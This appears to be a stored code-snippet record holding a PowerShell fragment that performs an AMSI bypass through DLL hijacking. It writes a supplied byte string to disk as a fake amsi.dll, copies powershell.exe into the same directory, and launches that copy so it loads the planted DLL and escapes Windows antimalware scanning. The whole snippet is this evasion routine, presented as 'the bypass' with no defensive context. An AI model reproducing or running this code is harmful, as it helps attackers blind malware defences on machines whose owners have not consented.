---
id: 921dd32e-812a-42a3-b72c-f73c02f2eb4d
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:26.063359+00:00'
updated_at: '2023-04-10T20:36:16.950469+00:00'
---

# Code Snippet 921dd32e

**Language**: ps1

```ps1
[Byte[]] $temp = $DllBytes -split ' '
Write-Output "Executing the bypass."
Write-Verbose "Dropping the fake amsi.dll to disk."
[System.IO.File]::WriteAllBytes("$pwd\amsi.dll", $temp)

Write-Verbose "Copying powershell.exe to the current working directory."
Copy-Item -Path C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Destination $pwd

Write-Verbose "Starting powershell.exe from the current working directory."
& "$pwd\powershell.exe"
```


